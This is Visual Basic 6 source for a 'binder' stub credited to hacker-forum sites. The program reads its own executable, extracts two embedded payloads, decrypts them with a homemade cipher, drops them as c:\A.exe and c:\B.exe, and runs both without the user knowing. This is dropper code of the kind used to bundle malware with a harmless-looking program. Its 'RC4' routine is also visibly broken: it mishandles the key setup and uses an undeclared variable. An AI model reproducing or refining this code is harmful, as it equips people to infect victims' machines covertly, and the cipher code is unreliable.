Attribute VB_Name = "Module1"
'haZl0oh // H7labs.com // Hackhound.Org // TheGoonSquad.Org
'Stub BBinder prj
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Const Perculator = "H7LABS"
Sub Main()
Dim f1 As String, f2 As String, mAll As String, BBB() As String, mMe As String: mMe = App.Path & "\" & App.EXEName & ".exe"
Dim lenStub As String
Dim test As String
Open mMe For Binary Access Read As #1: mAll = Space(LOF(1)): Get #1, , mAll: Close #1

        BBB = Split(mAll, Perculator)


f1 = BBB(1)
f2 = BBB(2)
f1 = RC4(f1, Perculator)
f2 = RC4(f2, Perculator)


        

Open "c:\A.exe" For Binary As #1: Put #1, , f1: Close #1
Open "c:\B.exe" For Binary As #2: Put #2, , f2: Close #2

Sleep (100)

Shell "c:\A.exe": Shell "c:\B.exe": End
End Sub
Public Function RC4(ByVal Data As String, ByVal Password As String) As String
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
    Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
    F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function

